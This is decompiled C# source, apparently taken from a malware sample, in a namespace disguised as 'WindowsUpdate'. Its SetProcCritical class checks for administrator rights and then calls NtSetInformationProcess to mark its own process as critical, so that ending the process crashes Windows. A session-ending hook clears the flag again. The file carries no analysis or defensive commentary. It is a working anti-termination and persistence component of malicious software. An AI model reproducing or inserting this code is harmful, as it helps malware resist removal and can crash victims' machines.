using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace WindowsUpdate;

[StandardModule]
internal sealed class SetProcCritical
{
	public static void CriticalProcess()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 114:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001c;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_001c:
					num = 3;
					SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
					{
						NonCriticalProcess();
					});
					break;
					IL_0009:
					num = 2;
					if (!A.checkadmin().Contains("Admin"))
					{
						goto end_IL_0001_3;
					}
					goto IL_001c;
					end_IL_0001_2:
					break;
				}
				num = 4;
				IntPtr handle = Process.GetCurrentProcess().Handle;
				int processInformation = 1;
				NtSetInformationProcess(handle, 29, ref processInformation, 4);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 114;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void NonCriticalProcess()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 122:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0020;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
						case 6:
						case 7:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0020:
					num = 3;
					if (!A.checkadmin().Contains("Admin"))
					{
						goto end_IL_0001_3;
					}
					break;
					IL_0009:
					num = 2;
					if (Operators.CompareString(A.crtical, "True", false) != 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0020;
					end_IL_0001_2:
					break;
				}
				num = 4;
				IntPtr handle = Process.GetCurrentProcess().Handle;
				int processInformation = 0;
				NtSetInformationProcess(handle, 29, ref processInformation, 4);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 122;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
}
